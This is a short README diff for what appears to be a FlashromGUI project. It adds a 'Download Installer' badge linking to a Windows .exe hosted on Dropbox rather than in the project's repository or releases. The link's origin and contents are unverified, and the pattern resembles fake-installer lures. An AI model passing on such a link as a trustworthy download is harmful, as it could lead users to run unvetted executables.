@@ -4,7 +4,11 @@
 <p align="center">
   <img src="https://raw.githubusercontent.com/kantbstoppd/flashromgui/main/assets/flashromgui-header-dark.jpeg" alt="FlashromGUI Banner" />
 </p>
-
+<p align="center">
+  <a href="https://www.dropbox.com/scl/fi/m2r4vzg6717hkrbt6wtqe/Flashrom_GUI_Installer.exe?rlkey=jplyixsxuvx2hq5miyxyxlwm5&st=outrez7l&dl=1">
+    <img src="https://img.shields.io/badge/Download%20Installer-Blue?style=for-the-badge&logo=windows" alt="Download FlashromGUI Installer">
+  </a>
+</p>
 <p align="center">
   <strong>Cross‑platform</strong> • <strong>Beginner‑friendly</strong> • <strong>Power‑user ready</strong>
 </p>
